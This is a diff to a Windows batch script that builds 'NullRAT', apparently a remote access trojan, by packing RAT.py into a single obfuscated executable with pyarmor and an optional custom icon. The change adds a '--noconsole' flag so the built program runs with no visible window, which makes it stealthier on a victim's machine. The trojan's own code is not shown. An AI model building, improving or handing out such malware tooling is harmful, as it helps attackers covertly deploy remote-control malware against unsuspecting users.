@@ -1,8 +1,6 @@
 @echo off & title NullRAT Compiler & color 2
 
-cd "%~dp0\src"
-
-
+cls & cd src\
 
 echo     ____  ___  ____________                      _ __         
 echo    / __ \/   ^|/_  __/ ____/___  ____ ___  ____  (_) /__  _____
@@ -20,13 +18,13 @@ exit /b 1
 :non_icon_compile
 echo. & echo Compiling NullRAT...
 echo -------------------- & echo.
-pyarmor pack -e "--onefile" RAT.py & cls 
+pyarmor pack -e "--onefile --noconsole" RAT.py & cls 
 cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
 if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
 
 :icon_compile
 echo. & echo Compiling NullRAT with icon...
 echo ------------------------------ & echo.
-pyarmor pack -e "--onefile --icon=custom_icon.ico" RAT.py & cls 
+pyarmor pack -e "--onefile --icon=custom_icon.ico --noconsole" RAT.py & cls 
 cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
-if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
+if %errorlevel% == 0 (cls & echo Successfully compiled! & exit /b 0) else (cls & echo Not compiled successfully :[ & echo. & pause & exit /b 1)
